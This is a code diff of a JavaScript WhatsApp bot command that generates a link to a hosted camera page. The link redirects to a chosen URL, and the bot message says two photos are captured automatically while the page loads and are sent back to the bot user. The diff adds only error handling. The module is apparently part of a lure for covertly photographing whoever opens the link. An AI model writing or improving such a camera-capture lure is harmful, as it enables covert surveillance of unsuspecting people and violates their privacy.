@@ -10,12 +10,17 @@ module.exports = async ({ text, reply, sock, from, msg, sessionId }) => {
 
   const targetUrl = parts[1];
 
-  // إذا لم يتم تعيين BASE_URL، نستخدم الرابط الفعلي من Render عبر req.headers
+  // ✅ استخدام الرابط الأساسي من Render أو المحلي
   const baseUrl = process.env.BASE_URL || `https://${process.env.RENDER_EXTERNAL_HOSTNAME || 'localhost:3000'}`;
 
   const pageUrl = `${baseUrl}/camera.html?redirect=${encodeURIComponent(targetUrl)}&chat=${encodeURIComponent(from)}&sessionId=${encodeURIComponent(sessionId)}`;
 
-  await sock.sendMessage(from, {
-    text: `📸 افتح الرابط للسماح بالكاميرا:\n${pageUrl}\n\n> سيتم التقاط صورتين تلقائيًا أثناء التحميل وإرسالها إليك.`
-  }, { quoted: msg });
+  try {
+    await sock.sendMessage(from, {
+      text: `📸 افتح الرابط للسماح بالكاميرا:\n${pageUrl}\n\n> سيتم التقاط صورتين تلقائيًا أثناء التحميل وإرسالها إليك.`
+    }, { quoted: msg });
+  } catch (err) {
+    console.error('❌ خطأ في إرسال رابط الكاميرا:', err.message);
+    await reply('⚠️ حدث خطأ أثناء إنشاء رابط الكاميرا.');
+  }
 };
